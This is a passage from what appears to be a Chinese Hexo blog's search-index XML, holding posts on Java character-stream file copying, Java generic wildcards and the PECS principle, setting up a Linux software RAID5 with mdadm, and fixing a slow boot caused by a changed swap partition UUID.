拷贝数据</span></span><br><span class="line">        <span class="keyword">char</span>[] buffer = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">int</span> len = reader.read(buffer);</span><br><span class="line">        <span class="keyword">while</span> (len != -<span class="number">1</span>) &#123;</span><br><span class="line">            writer.write(buffer, <span class="number">0</span> , len);</span><br><span class="line">            len = reader.read(buffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.关闭流</span></span><br><span class="line">        reader.close();</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一次拷贝一个一整行的 字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile3</span><span class="params">(String src, String dest)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 创建转换流</span></span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(src));</span><br><span class="line">        BufferedWriter writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(dest));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 拷贝数据</span></span><br><span class="line">        String data = reader.readLine();</span><br><span class="line">        <span class="keyword">while</span> (data != <span class="keyword">null</span>) &#123;</span><br><span class="line">            writer.write(data);</span><br><span class="line">            writer.newLine();</span><br><span class="line">            data = reader.readLine();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.关闭流</span></span><br><span class="line">        reader.close();</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="StringReader-amp-StringWriter"><a href="#StringReader-amp-StringWriter" class="headerlink" title="StringReader &amp; StringWriter"></a>StringReader &amp; StringWriter</h3><p>方便快捷的将字符串写入内存，或从内存读取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException </span>&#123;</span><br><span class="line">        <span class="comment">//1. 向内存写入数据，其内部提供了一个缓冲区</span></span><br><span class="line">        StringWriter writer = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        writer.write(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 读取数据</span></span><br><span class="line">        StringReader reader = <span class="keyword">new</span> StringReader(writer.toString());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] data = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len =  reader.read(data);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(data,<span class="number">0</span>,len));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> IO流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java泛型通配符详解</title>
      <link href="/archives/d17d42b.html"/>
      <url>/archives/d17d42b.html</url>
      
        <content type="html"><![CDATA[<p>本文转载自：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIwNDAwNzAw" title="https://www.zhihu.com/question/20400700">https://www.zhihu.com/question/20400700<i class="fa fa-external-link"></i></span></p><p>加了一点自己的想法。<em>这里吐槽一下《Java核心技术卷1》这一章的翻译者，翻译的是个什么鬼。</em></p><p><code>&lt;? extends T&gt;</code>和<code>&lt;? super T&gt;</code>是Java泛型中的<strong>“通配符（Wildcards）”</strong>和<strong>“边界（Bounds）”</strong>的概念。</p><ul><li><code>&lt;? extends T&gt;</code>：是指 <strong>“上界通配符（Upper Bounds Wildcards）”</strong></li><li><code>&lt;? super T&gt;</code>：是指 <strong>“下界通配符（Lower Bounds Wildcards）”</strong></li></ul><p>hexo 显示尖括号有问题，导向github:</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L3JhdmVueHJ6LmdpdGh1Yi5pby9ibG9iL21hc3Rlci9zb3VyY2UvX3Bvc3RzL0phdmElRTYlQjMlOUIlRTUlOUUlOEIlRTklODAlOUElRTklODUlOEQlRTclQUMlQTYlRTglQUYlQTYlRTglQTclQTMubWQ=" title="https://github.com/ravenxrz/ravenxrz.github.io/blob/master/source/_posts/Java%E6%B3%9B%E5%9E%8B%E9%80%9A%E9%85%8D%E7%AC%A6%E8%AF%A6%E8%A7%A3.md">https://github.com/ravenxrz/ravenxrz.github.io/blob/master/source/_posts/Java%E6%B3%9B%E5%9E%8B%E9%80%9A%E9%85%8D%E7%AC%A6%E8%AF%A6%E8%A7%A3.md<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="1-为什么要用通配符和边界？"><a href="#1-为什么要用通配符和边界？" class="headerlink" title="1. 为什么要用通配符和边界？"></a>1. 为什么要用通配符和边界？</h2><p>使用泛型的过程中，经常出现一种很别扭的情况。比如按照题主的例子，我们有Fruit类，和它的派生类Apple类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fruit</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span> <span class="keyword">extends</span> <span class="title">Fruit</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>然后有一个最简单的容器：Plate类。盘子里可以放一个泛型的“东西”。我们可以对这个东西做最简单的“放”和“取”的动作：<code>set( )</code>和<code>get( )</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Plate</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T item;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Plate</span><span class="params">(T t)</span></span>&#123;item=t;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T t)</span></span>&#123;item=t;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> item;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我定义一个“水果盘子”，逻辑上水果盘子当然可以装苹果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plate&lt;Fruit&gt; p=<span class="keyword">new</span> Plate&lt;Apple&gt;(<span class="keyword">new</span> Apple());</span><br></pre></td></tr></table></figure><p>但实际上Java编译器不允许这个操作。会报错，“装苹果的盘子”无法转换成“装水果的盘子”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: incompatible types: Plate&lt;Apple&gt; cannot be converted to Plate&lt;Fruit&gt;</span><br></pre></td></tr></table></figure><p>所以我的尴尬症就犯了。实际上，编译器脑袋里认定的逻辑是这样的：</p><ul><li>苹果 IS-A 水果</li><li>装苹果的盘子 NOT-IS-A 装水果的盘子</li></ul><p>所以，就算容器里装的东西之间有继承关系，但容器之间是没有继承关系的。所以我们不可以把Plate的引用传递给Plate。</p><p>为了让泛型用起来更舒服，Sun的大脑袋们就想出了<code>&lt;? extends T&gt;</code>和<code>&lt;? super T&gt;</code>的办法，来让“水果盘子”和“苹果盘子”之间发生关系。</p><h2 id="2-什么是上界？"><a href="#2-什么是上界？" class="headerlink" title="2. 什么是上界？"></a>2. 什么是上界？</h2><p>下面代码就是“上界通配符（Upper Bounds Wildcards）”：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plate&lt;？ extends Fruit&gt;</span><br></pre></td></tr></table></figure><p>翻译成人话就是：一个能放水果以及一切是水果派生类的盘子。再直白点就是：啥水果都能放的盘子。这和我们人类的逻辑就比较接近了。<code>Plate&lt;？ extends Fruit&gt;</code>和<code>Plate&lt;Apple&gt;</code>最大的区别就是：<code>Plate&lt;？ extends Fruit&gt;</code>是<code>Plate&lt;Fruit&gt;</code>以及<code>Plate&lt;Apple&gt;</code>的基类。直接的好处就是，我们可以用“苹果盘子”给“水果盘子”赋值了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plate&lt;? extends Fruit&gt; p=<span class="keyword">new</span> Plate&lt;Apple&gt;(<span class="keyword">new</span> Apple());</span><br></pre></td></tr></table></figure><p>如果把Fruit和Apple的例子再扩展一下，食物分成水果和肉类，水果有苹果和香蕉，肉类有猪肉和牛肉，苹果还有两种青苹果和红苹果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Lev 1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Food</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lev 2</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fruit</span> <span class="keyword">extends</span> <span class="title">Food</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Meat</span> <span class="keyword">extends</span> <span class="title">Food</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lev 3</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span> <span class="keyword">extends</span> <span class="title">Fruit</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Banana</span> <span class="keyword">extends</span> <span class="title">Fruit</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pork</span> <span class="keyword">extends</span> <span class="title">Meat</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Beef</span> <span class="keyword">extends</span> <span class="title">Meat</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lev 4</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedApple</span> <span class="keyword">extends</span> <span class="title">Apple</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GreenApple</span> <span class="keyword">extends</span> <span class="title">Apple</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>在这个体系中，下界通配符 <code>Plate&lt;？ extends Fruit&gt;</code> 覆盖下图中蓝色的区域。</p><p><img data-src="https://pic.downk.cc/item/5e5cd1f898271cb2b8af71ec.jpg"></p><h2 id="3-什么是下界？"><a href="#3-什么是下界？" class="headerlink" title="3. 什么是下界？"></a>3. 什么是下界？</h2><p>相对应的，“下界通配符（Lower Bounds Wildcards）”：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plate&lt;？ <span class="keyword">super</span> Fruit&gt;</span><br></pre></td></tr></table></figure><p>表达的就是相反的概念：一个能放水果以及一切是水果基类的盘子。<code>Plate&lt;？ super Fruit&gt;</code>是<code>Plate&lt;Fruit&gt;</code>的基类，但不是<code>Plate&lt;Apple&gt;</code>的基类。对应刚才那个例子，<code>Plate&lt;？ super Fruit&gt;</code>覆盖下图中红色的区域。</p><p><img data-src="https://pic.downk.cc/item/5e5cd21f98271cb2b8af89b1.jpg"></p><h2 id="4-上下界通配符的副作用"><a href="#4-上下界通配符的副作用" class="headerlink" title="4. 上下界通配符的副作用"></a>4. 上下界通配符的副作用</h2><p>边界让Java不同泛型之间的转换更容易了。但不要忘记，这样的转换也有一定的副作用。那就是容器的部分功能可能失效。</p><p>还是以刚才的Plate为例。我们可以对盘子做两件事，往盘子里set()新东西，以及从盘子里get()东西。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Plate</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T item;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Plate</span><span class="params">(T t)</span></span>&#123;item=t;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T t)</span></span>&#123;item=t;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> item;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1-上界-lt-extends-T-gt-不能往里存，只能往外取"><a href="#4-1-上界-lt-extends-T-gt-不能往里存，只能往外取" class="headerlink" title="4.1 上界&lt;? extends T&gt;不能往里存，只能往外取"></a>4.1 上界<code>&lt;? extends T&gt;</code>不能往里存，只能往外取</h3><p><code>&lt;? extends Fruit&gt;</code>会使往盘子里放东西的<code>set( )</code>方法失效。但取东西<code>get( )</code>方法还有效。比如下面例子里两个set()方法，插入Apple和Fruit都报错。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Plate&lt;? extends Fruit&gt; p=<span class="keyword">new</span> Plate&lt;Apple&gt;(<span class="keyword">new</span> Apple());</span><br><span class="line"></span><br><span class="line"><span class="comment">//不能存入任何元素</span></span><br><span class="line">p.set(<span class="keyword">new</span> Fruit());    <span class="comment">//Error</span></span><br><span class="line">p.set(<span class="keyword">new</span> Apple());    <span class="comment">//Error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取出来的东西只能存放在Fruit或它的基类里。</span></span><br><span class="line">Fruit newFruit1=p.get();</span><br><span class="line">Object newFruit2=p.get();</span><br><span class="line">Apple newFruit3=p.get();    <span class="comment">//Error</span></span><br></pre></td></tr></table></figure><p>原因是编译器只知道容器内是Fruit或者它的派生类，但具体是什么类型不知道。可能是Fruit？可能是Apple？也可能是Banana，RedApple，GreenApple？编译器在看到后面用Plate赋值以后，盘子里没有被标上有“苹果”。而是标上一个占位符：CAP#1，来表示捕获一个Fruit或Fruit的子类，具体是什么类不知道，代号CAP#1。然后无论是想往里插入Apple或者Meat或者Fruit编译器都不知道能不能和这个CAP#1匹配，所以就都不允许。</p><p>所以通配符<code>&lt;?&gt;</code>和类型参数的区别就在于，对编译器来说所有的T都代表同一种类型。比如下面这个泛型方法里，三个T都指代同一个类型，要么都是String，要么都是Integer。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">fill</span><span class="params">(T... t)</span></span>;</span><br></pre></td></tr></table></figure><p>但通配符<code>&lt;?&gt;</code>没有这种约束，<code>Plate&lt;?&gt;</code>单纯的就表示：盘子里放了一个东西，是什么我不知道。</p><p>所以题主问题里的错误就在这里，<code>Plate&lt;？ extends Fruit&gt;</code>里什么都放不进去。</p><h3 id="4-2-下界-lt-super-T-gt-不影响往里存，但往外取只能放在Object对象里"><a href="#4-2-下界-lt-super-T-gt-不影响往里存，但往外取只能放在Object对象里" class="headerlink" title="4.2 下界&lt;? super T&gt;不影响往里存，但往外取只能放在Object对象里"></a>4.2 下界<code>&lt;? super T&gt;</code>不影响往里存，但往外取只能放在Object对象里</h3><p>使用下界<code>&lt;? super Fruit&gt;</code>会使从盘子里取东西的get( )方法部分失效，只能存放到Object对象里。set( )方法正常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Plate&lt;? <span class="keyword">super</span> Fruit&gt; p=<span class="keyword">new</span> Plate&lt;Fruit&gt;(<span class="keyword">new</span> Fruit());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//存入元素正常</span></span><br><span class="line">p.set(<span class="keyword">new</span> Fruit());</span><br><span class="line">p.set(<span class="keyword">new</span> Apple());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取出来的东西只能存放在Object类里。</span></span><br><span class="line">Apple newFruit3=p.get();    <span class="comment">//Error</span></span><br><span class="line">Fruit newFruit1=p.get();    <span class="comment">//Error</span></span><br><span class="line">Object newFruit2=p.get();</span><br></pre></td></tr></table></figure><p>因为下界规定了元素的最小粒度的下限，实际上是放松了容器元素的类型控制。既然元素是Fruit的基类，那往里存粒度比Fruit小的都可以。但往外读取元素就费劲了，只有所有类的基类Object对象才能装下。但这样的话，元素的类型信息就全部丢失。</p><p><strong>个人之前一直不能理解super关键字，说好包含的是Fruit基类（包含Fruit）呢？为什么可以set Apple。知道回忆起多态两个字，马上懂了。这里说的“包含”其实是“指向”的意思，即</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plate&lt;? <span class="keyword">super</span> Fruit&gt; p=<span class="keyword">new</span> Plate&lt;Fruit&gt;(<span class="keyword">new</span> Fruit());</span><br></pre></td></tr></table></figure><p><strong>“=”的右边可以指向的限定在Fruit及其超类罢了。</strong></p><p>这两个关键字其实很简单，就是被这里误会它的意思了。</p><h3 id="4-3-PECS原则"><a href="#4-3-PECS原则" class="headerlink" title="4.3 PECS原则"></a>4.3 PECS原则</h3><p>最后看一下什么是PECS（Producer Extends Consumer Super）原则，已经很好理解了：</p><ul><li><strong>频繁往外读取内容的，适合用上界Extends。</strong></li><li><strong>经常往里插入的，适合用下界Super。</strong></li></ul><h2 id="5-无边界通配符"><a href="#5-无边界通配符" class="headerlink" title="5.无边界通配符"></a>5.无边界通配符</h2><p>还有一种通配符是无边界通配符，它的使用形式是一个单独的问号：<code>List&lt;?&gt;</code>，也就是没有任何限定。不做任何限制，跟不用类型参数的 <code>List</code> 有什么区别呢？</p><p><code>List&lt;?&gt; list</code> 表示 <code>list</code> 是持有某种特定类型的 List，但是不知道具体是哪种类型。那么我们可以向其中添加对象吗？当然不可以，因为并不知道实际是哪种类型，所以不能添加任何类型，这是不安全的。而单独的 <code>List list</code> ，也就是没有传入泛型参数，表示这个 list 持有的元素的类型是 <code>Object</code>，因此可以添加任何类型的对象，只不过编译器会有警告信息。</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>通配符的使用可以对泛型参数做出某些限制，使代码更安全，对于上边界和下边界限定的通配符总结如下：</p><ul><li>使用 <code>List&lt;? extends C&gt; list</code> 这种形式，表示 list 可以引用一个 <code>ArrayList</code> ( 或者其它 List 的 子类 ) 的对象，这个对象包含的元素类型是 <code>C</code> 的子类型 ( 包含 <code>C</code> 本身）的一种。</li><li>使用 <code>List&lt;? super C&gt; list</code> 这种形式，表示 list 可以引用一个 <code>ArrayList</code> ( 或者其它 List 的 子类 ) 的对象，这个对象包含的元素就类型是 <code>C</code> 的超类型 ( 包含 <code>C</code> 本身 ) 的一种。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIwNDAwNzAw" title="https://www.zhihu.com/question/20400700">Java 泛型 &lt;? super T&gt; 中 super 怎么 理解？与 extends 有何不同？<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwNTMzNzc4OQ==" title="https://segmentfault.com/a/1190000005337789">Java 泛型总结（三）：通配符的使用<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 泛型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux软riad配置详解</title>
      <link href="/archives/b85e04d0.html"/>
      <url>/archives/b85e04d0.html</url>
      
        <content type="html"><![CDATA[<p>系列文章：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b85e04d0.html">linux软riad配置详解</a></li><li><a href="https://www.ravenxrz.ink/archives/47bf0456.html">Linux配置iSCSI服务</a></li><li><a href="https://www.ravenxrz.ink/archives/f30ddec7.html">Linux配置Multipath访问iSCSI服务</a></li></ul><p>本文以raid5为例说明如何在linux下配置raid。</p><p>如果不熟悉raid的基本概念，请查看：<a href="https://www.ravenxrz.ink/archives/f0834f1f.html">知识扫盲-RAID0，RAID1，RAID5，RAID6，RAID10简介</a></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NzZG4xMDA4NjEvYXJ0aWNsZS9kZXRhaWxzLzUxNDM5NzE4" title="https://blog.csdn.net/csdn100861/article/details/51439718">软raid？ 硬raid？<i class="fa fa-external-link"></i></span></p><p>实验平台：VMware</p><a id="more"></a><h2 id="1-新建磁盘"><a href="#1-新建磁盘" class="headerlink" title="1. 新建磁盘"></a>1. 新建磁盘</h2><p>我们知道raid5至少需要3块磁盘，为了测试热备份，我们一共新建4个虚拟磁盘。其中3块（2块工作，1块校验盘）做raid5，另一块做热备份。 </p><p>将linux完全关机，选择虚拟机-&gt;设置，进入如下界面，选择”添加“：</p><p><img data-src="https://pic.downk.cc/item/5e5ba4cb773ff94fc654860a.jpg"></p><p>然后选择 硬盘-&gt;SCSI-&gt;创建新虚拟磁盘，然后给定虚拟盘一个大小即可，我给的是2G。这样就创键好1个虚拟盘了。</p><p>重复上述步骤，共得到4个2GB大小的磁盘。如下：</p><p><img data-src="https://pic.downk.cc/item/5e5ba570773ff94fc654a251.jpg"></p><h2 id="2-虚拟盘分区"><a href="#2-虚拟盘分区" class="headerlink" title="2. 虚拟盘分区"></a>2. 虚拟盘分区</h2><p>现在我们需要对在第一步中创建的4个虚拟盘进行分区，我使用的fdisk工具。<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGhlbGFkeWZsb3dlci9hcmNoaXZlLzIwMTEvMDgvMDcvMjEzMDE3MC5odG1s" title="https://www.cnblogs.com/theladyflower/archive/2011/08/07/2130170.html">fdisk使用教程<i class="fa fa-external-link"></i></span>,</p><p>以/dev/sdb为例，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk /dev/sdb</span><br></pre></td></tr></table></figure><ul><li>输入n,创建新分区</li><li>一路Enter即可</li><li>最后输入w，将所有修改结果写入。</li></ul><p>执行<code>sudo fdisk -l /dev/sdb</code>可查看分区结果：</p><p><img data-src="https://pic.downk.cc/item/5e5ba663773ff94fc654c072.jpg"></p><p>对/<code>dev/sdc /dev/sdd /dev/sde</code>重复上述操作。最后对得到<code>/dev/sdb1 /dev/sdc1  /dev/sdd1 /dev/sde1</code>四个分区。如下：</p><p><img data-src="https://pic.downk.cc/item/5e5ba6d4773ff94fc654cf37.jpg"></p><h2 id="3-建立Raid5"><a href="#3-建立Raid5" class="headerlink" title="3. 建立Raid5"></a>3. 建立Raid5</h2><p>建立raid主要使用的是mdadm命令，如果你的系统上找不到该命令，请根据自己的发行版软件管理包进行安装，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install mdadm  # debian系</span><br><span class="line">pacman -S mdadm# arch系</span><br></pre></td></tr></table></figure><p>接着执行如下命令，创建raid5：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mdadm --create /dev/md/raid5 --level=5 --raid-devices=3 --spare-devices=1 /dev/sd[b-e]1</span><br></pre></td></tr></table></figure><p>执行<code>sudo mdadm -D /dev/md/raid5</code>查看创建的raid5：</p><p><img data-src="https://pic.downk.cc/item/5e5ba836773ff94fc654f2d4.jpg"></p><p>采用fdisk对/dev/md/raid5分区，做法同上，这里不赘述。</p><p>接着需要对raid5格式化建立文件系统：</p><p>执行<code>sudo mkfs.ext4 /dev/md/raid5</code></p><h2 id="4-测试raid5"><a href="#4-测试raid5" class="headerlink" title="4. 测试raid5"></a>4. 测试raid5</h2><p>挂在raid5，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /mnt/raid5</span><br><span class="line">sudo mount /dev/md/raid5 /mnt/raid5</span><br><span class="line">cd /mnt/raid5</span><br></pre></td></tr></table></figure><p>执行df -Th 查看挂载结果：</p><p><img data-src="https://pic.downk.cc/item/5e5ba914773ff94fc65507a6.jpg"></p><h3 id="测试热备份效果"><a href="#测试热备份效果" class="headerlink" title="测试热备份效果"></a>测试热备份效果</h3><p>我们可以通过 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdadm &#x2F;path&#x2F;to&#x2F;raid_device_file -f &#x2F;path&#x2F;to&#x2F;disk_device_file </span><br></pre></td></tr></table></figure><p>来模拟某个盘出现故障，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mdadm /dev/md/raid5 -f /dev/sdb1</span><br></pre></td></tr></table></figure><p>再次执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mdadm -D /dev/md/raid5</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.downk.cc/item/5e5bab86773ff94fc65548b2.png"></p><p>可以看到 <code>/dev/sde1</code>盘作为热备起到了rebuild的效果。</p><p>如果这里没有<code>/dev/sde1</code>作为热备，数据也不会丢失，但是如果再有一个盘down掉，那数据可就找不回来了。</p><h2 id="5-卸载raid5"><a href="#5-卸载raid5" class="headerlink" title="5. 卸载raid5"></a>5. 卸载raid5</h2><p>执行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo umount /dev/md/raid5</span><br><span class="line">sudo mdadm -S /dev/md/raid5 </span><br></pre></td></tr></table></figure><p>综上！</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> raid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>a start job is running for dev-disk-by…问题解决</title>
      <link href="/archives/d633803a.html"/>
      <url>/archives/d633803a.html</url>
      
        <content type="html"><![CDATA[<p>给linux虚拟机扩容后，开机非常慢，主要是卡在了一行“a start job is running for dev-disk-by…”，后来发现是因为在扩容的时候，重新分配了swap分区，导致先swap分区和原swap分区的uuid不同，系统无法加载swap分区。</p><p>解决方案如下：</p><ol><li>执行</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo blkid</span><br></pre></td></tr></table></figure><p>记录当前swap分区的uuid。</p><p><img data-src="https://pic.downk.cc/item/5e4a018648b86553ee02a551.jpg"></p><ol start="2"><li>替换/etc/fstab文件中的swap分区uuid即可。</li></ol><p><img data-src="https://pic.downk.cc/item/5e4a015448b86553ee029a40.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 扩容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ideavim配置说明</title>
      <link href="/archives/9cf25d6b.html"/>
      <url>/archives/9cf25d6b.html</url>
      
